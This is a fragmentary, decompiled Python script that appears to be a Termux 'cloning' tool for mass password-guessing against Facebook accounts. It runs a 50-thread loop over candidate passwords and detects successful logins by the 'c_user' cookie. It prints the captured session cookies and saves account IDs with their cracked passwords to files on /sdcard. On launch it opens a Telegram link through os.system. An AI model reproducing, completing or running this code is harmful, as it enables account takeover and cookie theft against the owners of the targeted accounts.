...
# Time Succes decompile : 2024-06-22 22:33:31.504689
...
ha = current.day
today = date.today()
os.system('xdg-open https://t.me/ugigihi')
logo =("""
  \033[1;32m █████  ██████  ███████ ██   ██  █████  ██████  
  \033[1;32m██   ██ ██   ██ ██      ██   ██ ██   ██ ██   ██ 
  \033[1;32m███████ ██████  ███████ ███████ ███████ ██   ██ 
 ...
 \033[1;93m║     \033[1;96m[✓] CREATED BY\33[0;m   : \033[1;96m MD ARSHAD HOSAIN      \033[1;93m║
 \033[1;93m║     \033[1;32m[✓] FACEBOK     : \033[1;34m MD ARSHAD HOSAIN       \033[1;93m║
 \033[1;93m║     \033[1;35m[✓] GITHUB      :  \033[1;35m BOSS -ARSHAD         \033[1;93m ║
 ...
 \033[1;93m║  [\033[1;97m•\033[1;91m]\033[1;32m ARSHAD TERMUX COMMEND ZONE....          \033[1;93m ║
 ╚═════════════════[\033[1;32m MD-ARSHAD \033[1;32m]═════════════════╝""")
loop = 0
oks = []
cps = []
def clear():
...
def xxr():
    ...
    with ThreadPool(max_workers=50) as manshera:
        ...
        jalan(f'{x}[{xr}^{x}]\033[0;92m PLZ WAIT YOUR CLONING PROCESS HAS BEEN STARTED')
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('\r\r\033[1;32m[MD-ARSHAD-OK💚] ' +uid+ ' | ' +ps+    '  \n[‎‎🌺]\033[0;93m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
                cek_apk(session,coki)
                open('/sdcard/MD-ARSHAD-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(cid)
                break
                ...
                open('/sdcard/MD-ARSHAD-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\r%s{x}[{xr}MD-ARSHAD{x}][%s|%s][OK:{xr}%s{x}]'%(H,loop,tl,len(oks))),
        sys.stdout.flush()
    except:
        pass
